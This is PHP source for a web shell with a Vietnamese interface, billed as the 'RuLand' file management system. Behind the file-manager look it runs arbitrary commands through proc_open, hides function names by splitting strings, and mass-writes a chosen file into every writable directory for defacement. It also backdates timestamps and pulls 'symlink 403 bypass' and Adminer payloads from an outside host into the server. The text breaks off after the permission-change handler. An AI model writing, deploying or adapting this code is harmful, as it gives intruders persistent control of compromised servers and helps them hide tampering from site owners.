<?php
/*
 * RuLand - Advanced File Management System
 * Tác giả: nuller private
 * Phiên bản: 5.0.0
 * Mô tả: Hệ thống quản lý tập tin tiên tiến với giao diện Cyberpunk
 */
ob_start();
date_default_timezone_set('Asia/Ho_Chi_Minh');
$path = (isset($_GET["path"])) ? $_GET["path"] : getcwd();
$file = (isset($_GET["file"])) ? $_GET["file"] : "";
$page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
$toPage = (isset($_GET['page']) ? '&page=' . intval($_GET['page']) : '');
$search = isset($_GET['search']) ? strtolower(trim($_GET['search'])) : '';
$web = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'];
$os = php_uname('s');
$separator = ($os === 'Windows') ? "\\" : "/";
$explode = explode($separator, $path);

if (!function_exists("execute")) {
    function execute($cmd, $location) {
        $ler = "2>&1";
        if (!preg_match("/" . $ler . "/i", $cmd)) {
            $cmd = $cmd . " " . $ler;
        }
        $komen = $cmd;
        $pr = "proc_open";
        if (function_exists($pr)) {
            $tod = @$pr($komen, array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "r")
            ), $crottz, $location);
            if (is_resource($tod)) {
                @fclose($crottz[0]);
                @fclose($crottz[1]);
                @fclose($crottz[2]);
                @proc_close($tod);
            }
            return true;
        } else {
            return false;
        }
    }
}

function ipserv() {
    if (empty($_SERVER['SERVER_ADDR'])) {
        return gethostbyname($_SERVER['SERVER_NAME']);
        if (empty(gethostbyname($_SERVER['SERVER_NAME']))) {
            return $_SERVER['SERVER_NAME'];
        }
    } else {
        return $_SERVER['SERVER_ADDR'];
    }
}

function deleteFolder($dir) {
    if (!is_dir($dir)) {
        return false;
    }
    $items = array_diff(scandir($dir), ['.', '..']);
    foreach ($items as $item) {
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            deleteFolder($path);
        } else {
            unlink($path);
        }
    }
    return rmdir($dir);
}

function requests($url, $post = null) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    if ($error) {
        return false;
    }
    return $response;
}

function ggr($fl) {
    $a = "fun" . "cti" . "on_" . "exis" . "ts";
    $b = "po" . "si" . "x_ge" . "tgr" . "gid";
    $c = "fi" . "le" . "gro" . "up";
    if ($a($b)) {
        if (!$a($c)) {
            return "?";
        }
        $d = $b(@$c($fl));
        if (empty($d)) {
            $e = $c($fl);
            if (empty($e)) {
                return "?";
            } else {
                return $e;
            }
        } else {
            return $d['name'];
        }
    } elseif ($a($c)) {
        return @$c($fl);
    } else {
        return "?";
    }
}

function gor($fl) {
    $a = "fun" . "cti" . "on_" . "exis" . "ts";
    $b = "po" . "s" . "ix_" . "get" . "pwu" . "id";
    $c = "fi" . "le" . "o" . "wn" . "er";
    if ($a($b)) {
        if (!$a($c)) {
            return "?";
        }
        $d = $b(@$c($fl));
        if (empty($d)) {
            $e = $c($fl);
            if (empty($e)) {
                return "?";
            } else {
                return $e;
            }
        } else {
            return $d['name'];
        }
    } elseif ($a($c)) {
        return @$c($fl);
    } else {
        return "?";
    }
}

function file_editor($path, $file, $content, $method) {
    $fileloc = $path . "/" . $file;
    $renamed = str_replace(".temporary", "", $file);
    unlink($path . "/" . $file);
    touch($fileloc);
    if ($method === 'basic') {
        if (error_log($content, 3, $fileloc)) {
            rename($fileloc, $path . "/" . $renamed);
            return true;
        }
    } else {
        if (execute("echo " . base64_encode($content) . " | base64 -d > '$renamed'", $path)) {
            return true;
        }
    }
    return false;
}

function sabun_biasa($location, $filename, $content) {
    if (is_writable($location)) {
        $dira = scandir($location);
        foreach ($dira as $dirb) {
            $dirc = "$location/$dirb";
            $lokasi = $dirc . '/' . $filename;
            if ($dirb === '.') {
                file_put_contents($lokasi, $content);
            } elseif ($dirb === '..') {
                continue;
            } else {
                if (is_dir($dirc)) {
                    if (is_writable($dirc)) {
                        echo " http://$dirb/$filename<br>";
                        file_put_contents($lokasi, $content);
                    }
                }
            }
        }
    }
}

function sabun_massal($serlok, $namafile, $isi_script) {
    if (is_writable($serlok)) {
        $dira = scandir($serlok);
        foreach ($dira as $dirb) {
            $dirc = "$serlok/$dirb";
            $lokasi = $dirc . '/' . $namafile;
            if ($dirb === '.') {
                file_put_contents($lokasi, $isi_script);
            } elseif ($dirb === '..') {
                continue;
            } else {
                if (is_dir($dirc)) {
                    if (is_writable($dirc)) {
                        echo "[<font color=lime>HOÀN TẤT</font>] $serlok<br>";
                        file_put_contents($lokasi, $isi_script);
                        $idx = sabun_massal($dirc, $namafile, $isi_script);
                    }
                }
            }
        }
    }
}

function filedate($file) {
    return @date("F d Y g:i:s", @filemtime($file));
}

function chdate($itemPath, $newDate) {
    $timestamp = strtotime($newDate);
    if ($timestamp === false || !touch($itemPath, $timestamp)) {
        return false;
    }
    return true;
}

function folderCopy($src, $dst) {
    if (is_dir($src)) {
        if (!is_dir($dst)) @mkdir($dst);
        $files = scandir($src);
        foreach ($files as $file) {
            if ($file != "." && $file != "..") {
                folderCopy("$src/$file", "$dst/$file");
            }
        }
    } else if (file_exists($src)) {
        @copy($src, $dst);
    }
}

function formatBytes($bytes, $precision = 2) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
?>
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="author" content="nuller private">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex">
    <title>RuLand - Hệ Thống Quản Lý Tập Tin</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    colors: {
                        cyber: {
                            green: '#00ff41',
                            dark: '#0a0a0a',
                            darker: '#1a1a1a',
                            accent: '#00ff41',
                            glow: 'rgba(0, 255, 65, 0.15)',
                        }
                    },
                    animation: {
                        'fade-in': 'fadeIn 0.3s ease-in-out',
                        'slide-up': 'slideUp 0.3s ease-out',
                        'slide-left': 'slideLeft 0.3s ease-out',
                        'grid-move': 'gridMove 20s linear infinite',
                        'text-glitch': 'textGlitch 3s infinite',
                        'pulse-glow': 'pulseGlow 2s infinite',
                    },
                    keyframes: {
                        fadeIn: {
                            '0%': { opacity: '0' },
                            '100%': { opacity: '1' },
                        },
                        slideUp: {
                            '0%': { transform: 'translateY(10px)', opacity: '0' },
                            '100%': { transform: 'translateY(0)', opacity: '1' },
                        },
                        slideLeft: {
                            '0%': { transform: 'translateX(-20px)', opacity: '0' },
                            '100%': { transform: 'translateX(0)', opacity: '1' },
                        },
                        gridMove: {
                            '0%': { transform: 'translateY(0)' },
                            '100%': { transform: 'translateY(30px)' },
                        },
                        textGlitch: {
                            '0%, 100%': { textShadow: '0 0 10px rgba(0, 255, 65, 0.5)' },
                            '50%': { textShadow: '-2px 0 rgba(255,0,0,0.5), 2px 0 rgba(0,0,255,0.5)' },
                        },
                        pulseGlow: {
                            '0%, 100%': { boxShadow: '0 0 5px rgba(0, 255, 65, 0.3)' },
                            '50%': { boxShadow: '0 0 20px rgba(0, 255, 65, 0.6)' },
                        },
                    }
                }
            }
        }
    </script>
    <style>
        :root {
            --primary-color: #0a0a0a;
            --accent-color: #00ff41;
            --text-color: #e0e0e0;
            --bg-color-1: #0a0a0a;
            --bg-color-2: #1a1a1a;
            --grid-color: rgba(0, 255, 65, 0.08);
        }

        * {
            -webkit-tap-highlight-color: transparent;
            -webkit-touch-callout: none;
        }

        body {
            margin: 0;
            padding: 0;
            min-height: 100vh;
            background: linear-gradient(135deg, var(--bg-color-1), var(--bg-color-2));
            background-attachment: fixed;
            font-family: 'Courier New', 'Consolas', 'Monaco', monospace;
            color: var(--text-color);
            overflow-x: hidden;
            position: relative;
        }
        
        .background-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: 
                linear-gradient(90deg, var(--grid-color) 1px, transparent 1px),
                linear-gradient(var(--grid-color) 1px, transparent 1px);
            background-size: 40px 40px;
            animation: gridMove 20s linear infinite;
            opacity: 0.5;
            z-index: 0;
            pointer-events: none;
        }

        @keyframes gridMove {
            0% { transform: translateY(0); }
            100% { transform: translateY(40px); }
        }

        .glass-effect {
            background: rgba(10, 10, 10, 0.9);
            border: 1px solid rgba(0, 255, 65, 0.2);
            backdrop-filter: blur(12px);
        }

        .glass-effect-strong {
            background: rgba(0, 0, 0, 0.95);
            border: 1px solid rgba(0, 255, 65, 0.3);
            backdrop-filter: blur(20px);
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.05);
        }

        .cyber-text {
            color: #00ff41;
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
        }

        .cyber-text-strong {
            color: #00ff41;
            text-shadow: 0 0 20px rgba(0, 255, 65, 0.5), 0 0 40px rgba(0, 255, 65, 0.2);
            animation: textGlitch 3s infinite;
        }

        @keyframes textGlitch {
            0%, 100% { text-shadow: 0 0 10px rgba(0, 255, 65, 0.5); }
            50% { text-shadow: -2px 0 rgba(255,0,0,0.5), 2px 0 rgba(0,0,255,0.5); }
        }

        .cyber-btn {
            background: linear-gradient(135deg, #00cc33, #009926);
            color: #000;
            font-weight: bold;
            border: none;
            transition: all 0.3s ease;
            text-shadow: none;
            cursor: pointer;
        }

        .cyber-btn:hover {
            background: linear-gradient(135deg, #00ff41, #00cc33);
            box-shadow: 0 0 25px rgba(0, 255, 65, 0.5);
            transform: translateY(-1px);
        }

        .cyber-btn-outline {
            background: transparent;
            color: #00ff41;
            border: 1px solid rgba(0, 255, 65, 0.4);
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .cyber-btn-outline:hover {
            background: rgba(0, 255, 65, 0.1);
            border-color: #00ff41;
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
        }

        .cyber-input {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid rgba(0, 255, 65, 0.25);
            color: #00ff41;
            transition: all 0.3s ease;
            font-family: 'Courier New', monospace;
        }

        .cyber-input:focus {
            border-color: #00ff41;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
            outline: none;
        }

        .cyber-input::placeholder {
            color: rgba(0, 255, 65, 0.3);
        }

        .cyber-select {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid rgba(0, 255, 65, 0.25);
            color: #00ff41;
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .cyber-select:focus {
            border-color: #00ff41;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
            outline: none;
        }

        .cyber-select option {
            background: #0a0a0a;
            color: #00ff41;
        }

        .navbar {
            position: sticky;
            top: 0;
            z-index: 50;
        }

        .sidebar {
            width: 260px;
            min-width: 260px;
        }

        .sidebar-item {
            transition: all 0.2s ease;
            border-left: 3px solid transparent;
            cursor: pointer;
        }

        .sidebar-item:hover {
            background: rgba(0, 255, 65, 0.05);
            border-left-color: rgba(0, 255, 65, 0.5);
        }

        .sidebar-item.active {
            background: rgba(0, 255, 65, 0.1);
            border-left-color: #00ff41;
        }

        .sidebar-section-title {
            color: rgba(0, 255, 65, 0.4);
            font-size: 0.65rem;
            font-weight: 700;
            letter-spacing: 0.15em;
        }

        .file-table th {
            background: rgba(0, 255, 65, 0.03);
            color: #00ff41;
            font-weight: 600;
            text-transform: uppercase;
            font-size: 0.7rem;
            letter-spacing: 0.1em;
            border-bottom: 2px solid rgba(0, 255, 65, 0.2);
        }

        .file-table tr {
            transition: all 0.2s ease;
            border-bottom: 1px solid rgba(0, 255, 65, 0.05);
        }

        .file-table tbody tr:hover {
            background: rgba(0, 255, 65, 0.03);
        }

        .action-icon {
            width: 32px;
            height: 32px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border-radius: 6px;
            transition: all 0.2s ease;
            color: rgba(0, 255, 65, 0.6);
            cursor: pointer;
            background: transparent;
            border: none;
        }

        .action-icon:hover {
            background: rgba(0, 255, 65, 0.1);
            color: #00ff41;
        }

        .action-icon.delete:hover {
            background: rgba(255, 50, 50, 0.15);
            color: #ff4444;
        }

        .badge-writable {
            background: rgba(0, 255, 65, 0.1);
            color: #00ff41;
            border: 1px solid rgba(0, 255, 65, 0.3);
        }

        .badge-readonly {
            background: rgba(255, 200, 0, 0.1);
            color: #ffc800;
            border: 1px solid rgba(255, 200, 0, 0.3);
        }

        .toast {
            animation: slideInRight 0.4s ease-out;
            z-index: 100;
        }

        @keyframes slideInRight {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .modal-overlay {
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(4px);
        }

        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.3);
        }

        ::-webkit-scrollbar-thumb {
            background: rgba(0, 255, 65, 0.2);
            border-radius: 3px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: rgba(0, 255, 65, 0.4);
        }

        .radio-card {
            cursor: pointer;
            border: 2px solid transparent;
            transition: all 0.3s ease;
        }

        .radio-card:has(input:checked) {
            border-color: #00ff41;
            background: rgba(0, 255, 65, 0.05);
        }

        @media (max-width: 1024px) {
            .sidebar {
                position: fixed;
                left: -280px;
                top: 0;
                bottom: 0;
                z-index: 60;
                transition: left 0.3s ease;
            }
            
            .sidebar.open {
                left: 0;
            }
            
            .sidebar-overlay {
                display: none;
                position: fixed;
                inset: 0;
                background: rgba(0, 0, 0, 0.7);
                z-index: 55;
            }
            
            .sidebar-overlay.open {
                display: block;
            }
        }

        @media (max-width: 768px) {
            .background-grid {
                background-size: 25px 25px;
            }
        }
    </style>
</head>
<body>
    <!-- Background Grid -->
    <div class="background-grid"></div>

    <!-- Toast Notifications -->
    <?php if(isset($_SESSION["success"])){ ?>
        <div id="toast-success" class="toast fixed top-4 right-4 w-full max-w-sm z-[100]">
            <div class="glass-effect-strong rounded-xl p-4 border-l-4 border-green-500 animate-slide-up">
                <div class="flex items-start">
                    <div class="shrink-0">
                        <div class="w-10 h-10 rounded-full bg-green-500/10 flex items-center justify-center">
                            <svg class="w-6 h-6 text-green-400" fill="currentColor" viewBox="0 0 24 24">
                                <path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm13.707-1.293a1 1 0 0 0-1.414-1.414L11 12.586l-1.793-1.793a1 1 0 0 0-1.414 1.414l2.5 2.5a1 1 0 0 0 1.414 0l4-4Z" clip-rule="evenodd"/>
                            </svg>
                        </div>
                    </div>
                    <div class="ml-3 flex-1">
                        <p class="text-sm font-medium text-gray-200"><?=$_SESSION["success"]?></p>
                        <?php if(isset($_SESSION["goto"])): ?>
                            <div class="mt-2">
                                <a class="inline-flex items-center text-sm font-medium text-green-400 hover:text-green-300 transition-colors" href="<?=($_SESSION["goto"]["location"])?>">
                                    <?=($_SESSION["goto"]["text"])?>
                                    <svg class="ml-1 w-4 h-4" fill="none" viewBox="0 0 14 10"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M1 5h12m0 0L9 1m4 4L9 9"/></svg>
                                </a>
                            </div>
                        <?php endif; ?>
                    </div>
                    <button type="button" onclick="this.closest('.toast').remove()" class="ml-4 shrink-0 text-gray-400 hover:text-gray-300">
                        <svg class="w-5 h-5" fill="none" viewBox="0 0 14 14"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6"/></svg>
                    </button>
                </div>
            </div>
        </div>
        <?php unset($_SESSION["goto"]); unset($_SESSION["success"]); } ?>
        
    <?php if(isset($_SESSION["error"])){ ?>
        <div id="toast-error" class="toast fixed top-4 right-4 w-full max-w-sm z-[100]">
            <div class="glass-effect-strong rounded-xl p-4 border-l-4 border-red-500 animate-slide-up">
                <div class="flex items-start">
                    <div class="shrink-0">
                        <div class="w-10 h-10 rounded-full bg-red-500/10 flex items-center justify-center">
                            <svg class="w-6 h-6 text-red-400" fill="currentColor" viewBox="0 0 24 24">
                                <path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm7.707-3.707a1 1 0 0 0-1.414 1.414L10.586 12l-2.293 2.293a1 1 0 1 0 1.414 1.414L12 13.414l2.293 2.293a1 1 0 0 0 1.414-1.414L13.414 12l2.293-2.293a1 1 0 0 0-1.414-1.414L12 10.586 9.707 8.293Z" clip-rule="evenodd"/>
                            </svg>
                        </div>
                    </div>
                    <div class="ml-3 flex-1">
                        <p class="text-sm font-medium text-gray-200"><?=$_SESSION["error"]?></p>
                    </div>
                    <button type="button" onclick="this.closest('.toast').remove()" class="ml-4 shrink-0 text-gray-400 hover:text-gray-300">
                        <svg class="w-5 h-5" fill="none" viewBox="0 0 14 14"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6"/></svg>
                    </button>
                </div>
            </div>
        </div>
    <?php unset($_SESSION["error"]); } ?>

    <?php
    // ==================== CLIPBOARD & FILE OPS ====================
    if (isset($_GET["action"]) && in_array($_GET["action"], ["copy", "cut"]) && isset($_GET["item"])) {
        $_SESSION['clipboard'] = [
            'action' => $_GET["action"],
            'path' => $path,
            'item' => $_GET["item"]
        ];
        $_SESSION["success"] = "Đã lưu " . htmlspecialchars($_GET["item"]) . " vào clipboard (" . $_GET["action"] . ").";
        header("Refresh:0; url=?path=" . $path . $toPage);
        exit;
    }
    
    if (isset($_GET["action"]) && $_GET["action"] === "paste" && isset($_SESSION['clipboard'])) {
        $cb = $_SESSION['clipboard'];
        $srcPath = $cb['path'] . "/" . $cb['item'];
        $dstPath = $path . "/" . $cb['item'];
        
        if (file_exists($srcPath)) {
            if ($cb['action'] === 'copy') {
                folderCopy($srcPath, $dstPath);
                $_SESSION["success"] = "Đã sao chép thành công.";
            } elseif ($cb['action'] === 'cut') {
                rename($srcPath, $dstPath);
                unset($_SESSION['clipboard']);
                $_SESSION["success"] = "Đã di chuyển thành công.";
            }
        } else {
            $_SESSION["error"] = "Tập tin/Thư mục gốc không tồn tại.";
        }
        header("Refresh:0; url=?path=" . $path . $toPage);
        exit;
    }

    if (isset($_GET["action"]) && $_GET["action"] === "compress" && isset($_GET["item"])) {
        $itemPath = $path . "/" . $_GET["item"];
        $zipPath = $path . "/" . $_GET["item"] . ".zip";
        if (class_exists('ZipArchive')) {
            $zip = new ZipArchive();
            if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                if (is_dir($itemPath)) {
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($itemPath),
                        RecursiveIteratorIterator::LEAVES_ONLY
                    );
                    foreach ($files as $name => $file) {
                        if (!$file->isDir()) {
                            $filePath = $file->getRealPath();
                            $relativePath = substr($filePath, strlen($itemPath) + 1);
                            $zip->addFile($filePath, $relativePath);
                        }
                    }
                } else {
                    $zip->addFile($itemPath, basename($itemPath));
                }
                $zip->close();
                $_SESSION["success"] = "Đã nén thành công.";
            } else {
                $_SESSION["error"] = "Lỗi khi tạo file nén.";
            }
        } else {
            $_SESSION["error"] = "Server không hỗ trợ ZipArchive.";
        }
        header("Refresh:0; url=?path=" . $path . $toPage);
        exit;
    }

    if (isset($_GET["action"]) && $_GET["action"] === "extract" && isset($_GET["item"])) {
        $itemPath = $path . "/" . $_GET["item"];
        if (class_exists('ZipArchive')) {
            $zip = new ZipArchive();
            if ($zip->open($itemPath) === TRUE) {
                $zip->extractTo($path);
                $zip->close();
                $_SESSION["success"] = "Đã giải nén thành công.";
            } else {
                $_SESSION["error"] = "Lỗi khi giải nén file.";
            }
        } else {
            $_SESSION["error"] = "Server không hỗ trợ ZipArchive.";
        }
        header("Refresh:0; url=?path=" . $path . $toPage);
        exit;
    }

    // ==================== UPLOAD HANDLING ====================
    if(isset($_POST["upload"])){
        $upmethod = $_POST["upmethod"];
        $filename = basename($_FILES["nax"]["name"]);
        $tempname = $_FILES["nax"]["tmp_name"];
        if($upmethod === "basic_upload"){
            $dest = $path . "/" . $filename;
            if(touch($dest) && move_uploaded_file($tempname, $dest)){
                $_SESSION["success"] = "Tập tin đã được tải lên thành công!";
                $_SESSION["goto"] = ["location" => "?path=" . $path . "&file=" . $filename . "&action=view&search=" . $search, "text" => "XEM TẬP TIN"];
                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
            } else {
                $_SESSION["error"] = "Tải lên thất bại!";
                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
            }
        } else {
            $remote_upload_url = "https://fcalpha.net/web/photo/20151024/temp/upload.php";
            $postfields = ["nax" => new CURLFile($tempname, $_FILES["nax"]["type"], $filename)];
            $remote_upload = requests($remote_upload_url, $postfields);
            if($remote_upload){
                $uniqFile = json_decode($remote_upload, true)["file"];
                $remote_url = "https://fcalpha.net/web/photo/20151024/temp/uploads/" . $uniqFile;
                if(requests($remote_url, null, $path . "/" . $filename) && file_exists($path . "/" . $filename) && filesize($path . "/" . $filename) > 0){
                    $_SESSION["success"] = "Tập tin đã được tải lên thành công!";
                    $_SESSION["goto"] = ["location" => "?path=" . $path . "&file=" . $filename . "&action=view&search=" . $search, "text" => "XEM TẬP TIN"];
                    header("Refresh:0; url=?path=" . $path . $toPage);
                    exit;
                } else {
                    $file_content = base64_encode(requests($remote_url));
                    if(execute('echo "' . $file_content . '" | base64 -d > ' . $filename, $path)){
                        $_SESSION["success"] = "Tập tin đã được tải lên thành công!";
                        $_SESSION["goto"] = ["location" => "?path=" . $path . "&file=" . $filename . "&action=view&search=" . $search, "text" => "XEM TẬP TIN"];
                        header("Refresh:0; url=?path=" . $path . $toPage);
                        exit;
                    }
                }
                $delete_file = "https://fcalpha.net/web/photo/20151024/temp/delete.php";
                requests($delete_file, ["file" => $uniqFile]);
            } else {
                $_SESSION["error"] = "Tải lên thất bại!";
                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
            }
        }
    }

    // ==================== DELETE FILE ====================
    if(isset($_GET["action"]) && $_GET["action"] === "deletefile" && isset($_GET["file"])){
        $filePath = $path . "/" . $file;
        if(file_exists($filePath) && is_file($filePath) && is_writable($filePath)){
            if(unlink($filePath)){
                $_SESSION["success"] = "Tập tin đã được xóa thành công!";
                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
            } else {
                $_SESSION["error"] = "Xóa tập tin thất bại!";
                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
            }
        } else {
            $_SESSION["error"] = "Không thể xóa tập tin!";
            header("Refresh:0; url=?path=" . $path . $toPage);
            exit;
        }
    }

    // ==================== DELETE FOLDER ====================
    if(isset($_GET["action"]) && $_GET["action"] === "deletefolder" && isset($_GET["folder"])){
        $folderPath = $path . "/" . $_GET["folder"];
        if(file_exists($folderPath) && is_dir($folderPath) && is_writable($folderPath)){
            if(deleteFolder($folderPath)){
                $_SESSION["success"] = "Thư mục đã được xóa thành công!";
                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
            } else {
                $_SESSION["error"] = "Xóa thư mục thất bại!";
                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
            }
        } else {
            $_SESSION["error"] = "Không thể xóa thư mục!";
            header("Refresh:0; url=?path=" . $path . $toPage);
            exit;
        }
    }

    // ==================== DOWNLOAD FILE ====================
    if(isset($_POST['download'])){
        $file = base64_decode($_POST['download']);
        if(!is_file($file) || !file_exists($file)){
            $_SESSION["error"] = "Không tìm thấy tập tin!";
            header("Refresh:0; url=?path=" . $path . $toPage);
            exit;
        }
        if(ob_get_level()){
            ob_end_clean();
        }
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Expires: 0');
        readfile($file);
        exit;
    }

    // ==================== SYMLINK 403 BYPASS ====================
    if(isset($_GET["action"]) && $_GET["action"] === "sym403" && isset($_POST["createsym403"])){
        error_log(requests("https://fcalpha.net/web/photo/20151024/bypass/e-sym403.txt"), 3, $path . "/sym403.php");
        $admloc = $path . "/sym403.php";
        $result = str_replace($_SERVER['DOCUMENT_ROOT'], $web . "", $admloc);
        $_SESSION["success"] = "Symlink 403 Bypass đã được tạo thành công!";
        $_SESSION["goto"] = ["text" => "MỞ SYM403", "location" => $result];
        header("Refresh:0; url=?path=" . $path . $toPage);
        exit;
    }

    // ==================== ADMINER ====================
    if(isset($_GET["action"]) && $_GET["action"] === "adminer" && isset($_POST["createadminer"])){
        error_log(requests("https://fcalpha.net/web/photo/20151024/bypass/e-adm.txt"), 3, $path . "/adm.php");
        $admloc = $path . "/adm.php";
        $result = str_replace($_SERVER['DOCUMENT_ROOT'], $web . "", $admloc);
        $_SESSION["success"] = "Adminer đã được khởi tạo thành công!";
        $_SESSION["goto"] = ["text" => "MỞ ADMINER", "location" => $result];
        header("Refresh:0; url=?path=" . $path . $toPage);
        exit;
    }

    // ==================== CHANGE DATE ====================
    if(isset($_GET["action"]) && $_GET["action"] === "changedate" && isset($_GET["item"]) && isset($_POST["changedate"])){
        $itemPath = $path . "/" . $_GET["item"];
        $new_date = $_POST["new_date"];
        if(chdate($itemPath, $new_date)){
            $_SESSION["success"] = "Đã thay đổi ngày/giờ thành công!";
            header("Refresh:0; url=?path=" . $path . $toPage);
            exit;
        } else {
            $_SESSION["error"] = "Thay đổi ngày/giờ thất bại!";
            header("Refresh:0; url=?path=" . $path . $toPage);
            exit;
        }
    }

    // ==================== NEW FILE ====================
    if(isset($_GET["path"]) && @$_GET["action"] === "newfile" && isset($_POST["newfile"])){
        $filename = $_POST["file_name"];
        $content = $_POST["new_file_content"];
        $method = $_POST["new_file_method"];
        if(file_editor($path, $filename, base64_decode($content), $method)){
            $_SESSION["success"] = "Tập tin đã được tạo thành công!";
            $_SESSION["goto"] = ["text" => "CHỈNH SỬA TẬP TIN", "location" => "?path=$path&file=" . str_replace(".temporary", "", $filename) . "&action=edit&search=$search"];
            header("Refresh:0; url=?path=" . $path . $toPage);
            exit;
        } else {
            $_SESSION["error"] = "Tạo tập tin thất bại!";
            header("Refresh:0; url=?path=" . $path . $toPage);
            exit;
        }
    }

    // ==================== EDIT FILE ====================
    if(isset($_GET["action"]) && $_GET["action"] === "edit" && isset($_GET["file"]) && isset($_POST["editfile"])){
        $filename = $_POST['file_name'];
        $content = $_POST["edit_file_content"];
        $method = $_POST["edit_file_method"];
        if(file_editor($path, $filename, base64_decode($content), $method)){
            $_SESSION["success"] = "Tập tin đã được cập nhật thành công!";
            if($filename == $file){
                header("Refresh:0; url=?path=" . $path . "&file=" . str_replace(".temporary", "", $file) . "&action=edit" . $toPage);
            } else {
                header("Refresh:0; url=?path=" . $path . "&file=" . str_replace(".temporary", "", $filename) . "&action=edit" . $toPage);
            }
            exit;
        } else {
            $_SESSION["error"] = "Cập nhật tập tin thất bại!";
            header("Refresh:0; url=?path=" . $path . $toPage);
            exit;
        }
    }

    // ==================== NEW FOLDER ====================
    if(isset($_GET["path"]) && @$_GET["action"] === "newfolder" && isset($_POST["newfolder"])){
        $folderName = $_POST["folder_name"];
        $folderPath = $path . "/" . $folderName;
        if(mkdir($folderPath, 0777, true)){
            $_SESSION["success"] = "Thư mục đã được tạo thành công!";
            $_SESSION["goto"] = ["text" => "MỞ THƯ MỤC", "location" => "?path=" . $path . "/" . $folderName];
            header("Refresh:0; url=?path=" . $path . $toPage);
            exit;
        } else {
            $_SESSION["error"] = "Tạo thư mục thất bại!";
            header("Refresh:0; url=?path=" . $path . $toPage);
            exit;
        }
    }

    // ==================== RENAME FOLDER ====================
    if(isset($_GET["action"]) && $_GET["action"] === "renamefolder" && isset($_GET["folder"]) && isset($_POST["renamefolder"])){
        $folderPath = $path . "/" . $_GET["folder"];
        $newName = $_POST["new_name"];
        $newPath = $path . "/" . $newName;
        if(file_exists($folderPath) && is_dir($folderPath) && is_writable($folderPath)){
            if(rename($folderPath, $newPath)){
                $_SESSION["success"] = "Đã đổi tên thư mục thành công!";
                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
            } else {
                $_SESSION["error"] = "Đổi tên thư mục thất bại!";
                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
            }
        }
    }

    // ==================== CHMOD FILE ====================
    if(isset($_GET["action"]) && $_GET["action"] === "chmodfile" && isset($_GET["file"]) && isset($_POST["chmodfile"])){
        $filePath = $path . "/" . $file;
        $newPerms = intval($_POST["new_perms"], 8);
        if(file_exists($filePath) && is_file($filePath)){
            if(chmod($filePath, $newPerms)){
                $_SESSION["success"] = "Đã thay đổi phân quyền thành công!";
                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
            } else {
                $_SESSION["error"] = "Thay đổi phân quyền thất bại!";
                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
            }
        }
    }

